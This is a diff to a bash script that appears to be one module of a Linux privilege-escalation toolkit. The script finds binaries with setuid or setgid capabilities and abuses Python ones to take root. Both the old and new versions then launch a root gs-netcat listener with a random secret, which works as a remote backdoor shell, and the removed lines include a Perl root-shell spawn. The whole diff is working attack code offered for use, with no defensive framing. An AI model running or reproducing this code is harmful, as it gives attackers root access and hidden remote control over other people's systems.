@@ -1,14 +1,13 @@
 #!/bin/bash
 source "$(dirname "$0")/00_common.sh"
-METHOD="capabilities"
+M="caps"
 info "Checking capabilities..."
-cap_bins=$(getcap -r / 2>/dev/null|grep -E 'cap_setuid|cap_setgid|cap_dac_override')
-[ -z "$cap_bins" ] && { result_json "$METHOD" "skip" "No dangerous caps"; exit 1; }
-echo "$cap_bins"|while read line; do
+caps=$(getcap -r / 2>/dev/null|grep -E 'cap_setuid|cap_setgid')
+[ -z "$caps" ] && { result "$M" "skip" "None" ""; exit 1; }
+while read -r line; do
     bin=$(echo "$line"|cut -d' ' -f1)
     case "$(basename $bin)" in
-        python*) secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -c "import os;os.setuid(0);os.system('nohup gs-netcat -s $secret -l -i &>/dev/null &')" 2>/dev/null && { result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
-        perl) "$bin" -e 'use POSIX qw(setuid);setuid(0);exec "/bin/sh"' 2>/dev/null;;
+        python*) s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -c "import os;os.setuid(0);os.system('nohup gs-netcat -s $s -l -i &')" 2>/dev/null && { result "$M" "success" "$bin" "$s"; exit 0; };;
     esac
-done
-result_json "$METHOD" "fail" "No exploitable caps"; exit 1
+done <<< "$caps"
+result "$M" "fail" "No exploit" ""; exit 1
